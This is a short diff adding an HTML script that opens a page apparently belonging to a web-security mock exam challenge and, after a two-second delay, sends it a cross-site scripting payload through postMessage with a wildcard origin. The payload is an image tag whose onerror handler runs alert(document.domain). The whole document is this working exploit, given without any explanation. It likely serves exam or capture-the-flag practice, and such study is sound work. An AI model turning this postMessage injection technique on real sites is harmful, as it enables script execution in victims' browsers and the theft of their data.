@@ -1,0 +1,8 @@
+<script>
+    let target = window.open("https://preben.net/mockexam/challenge4.5.php");
+
+    setTimeout(function () {
+        target.postMessage(`<img src="" onerror=alert(document.domain)>`, "*");
+
+    }, 2000);
+</script>
